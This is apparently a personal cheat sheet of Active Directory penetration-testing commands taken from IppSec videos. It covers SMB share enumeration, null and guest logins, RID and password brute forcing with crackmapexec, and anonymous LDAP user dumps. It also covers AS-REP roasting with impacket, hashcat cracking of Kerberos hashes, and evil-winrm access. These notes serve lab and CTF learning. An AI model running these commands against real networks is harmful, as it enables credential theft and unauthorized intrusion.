

```
Some usefull commands/tools I found while watching IPSec vids.
```
<https://ippsec.rocks/>


### smbclient
### list shares (sometimes no pw is requires)

```
smbclient -L 192.168.50.20

smbclient -N -L  192.168.50.20

smbclient -N  //192.168.50.20/sharename

smbclient -U '' -L  //192.168.50.20

smbclient -U 'guest' -L  //192.168.50.20
              anonymous
```

### Log onto the Users share
```
smbclient //192.168.50.20/Users
```


### Software updates
```
smbclient //192.168.50.20/Software_Updates

```

### Mounting SMB

```
First install cifs-utils, so that you can mount the SMB remotely

sudo apt install cifs-utils

create the mountpoint first

sudo mkdir /mnt/usr

sudo mount -t cifs //192.168.50.20/Users /mnt/user

sudo mount -t cifs //192.168.50.20/Data /mnt/data

```

### Now you should be able to access the data you pulled from SMB in your /mnt directory

```
cd /mnt

smbmap

smbmap -H 192.168.50.20

smbmap -H 192.168.50.20 -u 'fakeusername'

```

## cracmapexec for SMB

### list the shares
```
crackmapexec smb 192.168.99.162 --shares
```
### Get info on their pw policy:
```
crackmapexec smb --pass-pol 192.168.99.162
```
### Null authentication
```
crackmapexec smb  192.168.99.162 -u '' -p ''
```

### enumerate a DC's users
```
crackmapexec smb 192.168.99.162 --users
```

### try with non-existant user
```
crackmapexec smb 192.168.99.162 --shares -u fakeuname -p fakepwd
```

### discover who's logged on
```
crackmapexec smb 192.168.99.162 --loggedon-users

```
### bruteforce some smb if you can
```
crackmapexec smb 192.168.99.162 --rid-brute 4000
```
### crack password of an enumerated user/or Built in
```
crackmapexec smb 192.168.99.162 -u Guest -p rockyou.txt

```
### Brute force
```
crackmapexec smb 192.168.99.162 -u 'Administrator' -p 'PASS' --rid-brute
```
### More stuff
```
crackmapexec smb 192.168.1.10 -u svc-user -p userspw
```

## LDAP

__ldapsearch is a good alternative to enum4linux.

```
ldapsearch -h <targetIP>  -x

ldapseach -h 192.168.1.10 -x -s base namingcontexts

ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" > ldap-anonymous.out

grep -i "memberof" ldap-anonymous.out

less ldap-anonymous.out

ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName

ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap

```

### Some IMPACKET Python script useage.
```

sudo impacket-smbserver -smb2support -user yourname -password yourpassword sharename $(pwd)

Some how-to use of various impacket scripts & hashcat
IMPACKET & hashcat

./GetNPUsers.py -dc-ip 192.168.1.10 -request 'target.domain/'

./GetNPUsers.py -dc-ip 192.168.1.10 -request 'target.domain/' -format hashcat

```

### Crack the pw with Hashcat
**Kerberos**

```
./hashcat --example-hashes | grep -i krb

asrep23

create a text doc with the hash

Vim hashes/svc-dude

once you get the dudes pw do

crackmapexec smb 192.168.1.10 -u svc-dude -p dudespw

should log in

crackmapexec smb 192.168.1.10 -u svc-dude -p dudespw --shares

get group policy pw if you can

search the hashes file to get the mode number

./hashcat --example-hashes | less

mode 18200 for asrep

hascat cmd

hashcat -m 18200 hashse/svc-dude  /opt/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule


you can also create wordlists with hashcat.. that will be posted later
```

### Commands n stuff
```
instead of grep, try ripgrep
instead of cat, try bat
when using ripgrep, it's used with the same syntax as grep, except you only have to type ripgrep
```

### example

```
rg -i "chars" file.txt

also can search a directory:

ls -l | rg -i "document"
```

**winrm**
```
./evil-winrm.rb -u svc-user -p hispassword -i 192.168.1.10

```
